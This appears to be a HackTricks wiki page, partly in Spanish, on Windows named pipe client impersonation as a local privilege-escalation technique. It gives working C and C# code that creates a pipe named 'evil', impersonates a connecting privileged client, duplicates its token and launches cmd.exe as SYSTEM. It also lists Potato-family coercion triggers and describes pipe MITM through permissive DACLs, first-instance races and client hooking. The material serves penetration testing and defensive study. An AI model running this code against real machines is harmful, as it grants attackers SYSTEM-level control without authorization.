# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation es un primitive de local privilege escalation que permite que un hilo de un named-pipe server adopte el contexto de seguridad de un cliente que se conecta a él. En la práctica, un atacante que puede ejecutar código con SeImpersonatePrivilege puede forzar a un cliente privilegiado (p. ej., un servicio SYSTEM) a conectarse a un pipe controlado por el atacante, llamar a ImpersonateNamedPipeClient, duplicar el token resultante en un primary token y lanzar un proceso como el cliente (a menudo NT AUTHORITY\SYSTEM).

Esta página se centra en la técnica principal. Para cadenas de explotación end-to-end que fuerzan a SYSTEM a conectarse a tu pipe, consulta las páginas de la familia Potato referenciadas abajo.

## TL;DR
- Create a named pipe: \\.\pipe\<random> and wait for a connection.
- Make a privileged component connect to it (spooler/DCOM/EFSRPC/etc.).
- Read at least one message from the pipe, then call ImpersonateNamedPipeClient.
- Open the impersonation token from the current thread, DuplicateTokenEx(TokenPrimary), and CreateProcessWithTokenW/CreateProcessAsUser to get a SYSTEM process.

## Requirements and key APIs
- Privileges typically needed by the calling process/thread:
- SeImpersonatePrivilege to successfully impersonate a connecting client and to use CreateProcessWithTokenW.
- Alternatively, after impersonating SYSTEM, you can use CreateProcessAsUser, which may require SeAssignPrimaryTokenPrivilege and SeIncreaseQuotaPrivilege (these are satisfied when you’re impersonating SYSTEM).
- Core APIs used:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (must read at least one message before impersonation)
- ImpersonateNamedPipeClient and RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW or CreateProcessAsUser
- Impersonation level: to perform useful actions locally, the client must allow SecurityImpersonation (default for many local RPC/named-pipe clients). Clients can lower this with SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION when opening the pipe.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notas:
- Si ImpersonateNamedPipeClient devuelve ERROR_CANNOT_IMPERSONATE (1368), asegúrate de leer primero del pipe y de que el cliente no haya restringido la impersonación al nivel Identification.
- Prefiere DuplicateTokenEx con SecurityImpersonation y TokenPrimary para crear un token primario adecuado para la creación de procesos.

## .NET quick example
En .NET, NamedPipeServerStream puede impersonar mediante RunAsClient. Una vez impersonando, duplica el token del hilo y crea un proceso.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Common triggers/coercions to get SYSTEM to your pipe
Estas técnicas coaccionan a servicios privilegiados para que se conecten a tu named pipe, de modo que puedas impersonarlos:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

See detailed usage and compatibility here:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

If you just need a full example of crafting the pipe and impersonating to spawn SYSTEM from a service trigger, see:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (ACLs, First-Instance Races, Client Hooking)

Cuando un servicio privilegiado y un proceso con pocos privilegios se comunican por `\\.\pipe\...`, trata el pipe como cualquier otro límite IPC no confiable. Más allá de la clásica impersonation del lado del servidor, las ACL débiles del pipe, los flags de creación inseguros y las decisiones de confianza del lado del cliente también pueden convertirse en primitivas de local privilege escalation.

### Enumerate candidate pipes first
- Lista pipes rápidamente desde PowerShell: `Get-ChildItem \\.\pipe\`
- Sysinternals `pipelist64.exe` es útil para detectar el número de instancias y pipes de una sola instancia.
- Prioriza nombres usados por servicios que se ejecutan como `SYSTEM`, especialmente helpers, updaters, launchers y UI brokers.

### MITM via permissive DACLs and extra pipe instances
- Cualquier proceso que pueda hablar con un servidor privilegiado ya puede fuzzear su protocolo y buscar verbos privilegiados.
- El caso más interesante es cuando la DACL concede `FILE_GENERIC_WRITE`/`GENERIC_WRITE` sobre el objeto pipe. En named pipes esto incluye implícitamente `FILE_CREATE_PIPE_INSTANCE` (`FILE_APPEND_DATA` comparte el mismo bit), así que un atacante puede crear otra instancia de servidor con el mismo nombre.
- Como las instancias se emparejan en orden FIFO, las instancias creadas por el atacante y las legítimas pueden intercalarse: crea una instancia rogue con `CreateNamedPipe`, luego abre el mismo nombre de pipe con `CreateFile`, y espera a que un cliente real caiga en la instancia rogue del servidor.
- Resultado: observar, modificar, relay o desincronizar IPC privilegiado sin necesidad de controlar el proceso servidor original.

### First-instance race on pipe security descriptors
- `lpSecurityAttributes` solo define la DACL cuando se crea la primera instancia de un nombre de pipe.
- Si un servicio privilegiado arranca tarde y no usa `FILE_FLAG_FIRST_PIPE_INSTANCE`, un atacante puede precrear el nombre del pipe con una DACL permisiva, y luego dejar que el servicio cree instancias posteriores bajo el contexto de seguridad elegido por el atacante.
- Esto convierte el arranque del servicio en una race condition: ganar la primera instancia y luego conectar o hacer MITM a clientes posteriores usando la ACL debilitada.
- Mitigación para defensores, y un punto clave de revisión para atacantes: comprueba si `CreateNamedPipe(..., dwOpenMode, ...)` incluye `FILE_FLAG_FIRST_PIPE_INSTANCE`. Si no, prueba la precreación antes de que el servicio arranque.

### PID/signature checks are hardening, not a boundary
- Algunos productos intentan restringir el acceso comprobando `GetNamedPipeClientProcessId`, la ruta de la imagen del proceso o el firmante Authenticode del cliente que se conecta.
- Esto solo ayuda hasta que inyectas en el cliente legítimo: una vez dentro del proceso confiable, heredas exactamente el contexto de PID/imagen/firma que el servidor espera.
- Para split desktop apps, instrumentar el proceso UI/helper de bajos privilegios suele ser más fácil que atacar directamente el servicio `SYSTEM`.

### Hook the client according to its I/O model
- Synchronous I/O: intercepta `NtWriteFile` antes de que la syscall consuma el buffer, e inspecciona/parchea `NtReadFile` después de que retorne.
- Overlapped I/O: guarda el `OVERLAPPED`/`IoStatusBlock` visto en `NtReadFile`, luego inspecciona el buffer después de `GetOverlappedResult` o cuando termine la espera correspondiente.
- Completion ports: `GetQueuedCompletionStatus` llega a `NtRemoveIoCompletion`; el `ApcContext` devuelto enlaza con el `OVERLAPPED` usado por la lectura original, que es el pivote correcto para encontrar el buffer ya poblado.
- Completion routines (`ReadFileEx`): la callback de completado se entrega como un APC. Si quieres modificar datos devueltos o inyectar respuestas sintéticas, hookea la real completion routine y, para inyección personalizada, usa un dispatcher `QueueUserAPC` de un argumento que reconstruya los 3 argumentos esperados por la rutina.

### Tooling notes
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) proxya el tráfico de named-pipe mediante una DLL helper inyectada y expone un flujo de trabajo tipo Burp para edición/replay.
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe) adopta un enfoque basado en Frida y se centra en hookear `NtReadFile`/`NtWriteFile` más los pivots async/completion anteriores, y luego reenviar el tráfico a un flujo de trabajo de edición respaldado por WebSocket.
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
### Consideraciones operativas
- Named pipes tienen baja latencia; pausas largas mientras editas buffers pueden deadlock servicios frágiles.
- Clientes basados en Overlapped/completion-port/APC necesitan hooks distintos a los simples detours de `ReadFile`/`WriteFile`.
- La inyección en el trusted client es ruidosa y, por lo general, es mejor reservarla para exploit development, protocol reversing o fuzzing en un laboratorio local.

## Troubleshooting y gotchas
- Debes leer al menos un mensaje de la pipe antes de llamar a `ImpersonateNamedPipeClient`; de lo contrario obtendrás `ERROR_CANNOT_IMPERSONATE` (1368).
- Si el cliente se conecta con `SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION`, el servidor no puede impersonar completamente; comprueba el nivel de impersonation del token mediante `GetTokenInformation(TokenImpersonationLevel)`.
- `CreateProcessWithTokenW` requiere `SeImpersonatePrivilege` en el proceso que llama. Si eso falla con `ERROR_PRIVILEGE_NOT_HELD` (1314), usa `CreateProcessAsUser` después de haber impersonado ya a `SYSTEM`.
- Asegúrate de que el security descriptor de tu pipe permita que el servicio objetivo se conecte si lo endureces; por defecto, las pipes bajo `\\.\pipe` son accesibles según la DACL del servidor.

## References
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [Microsoft: Named Pipe Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [Microsoft: CreateNamedPipe function](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [Microsoft: Named Pipe Server Using Completion Routines](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [Synacktiv: Hooking Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
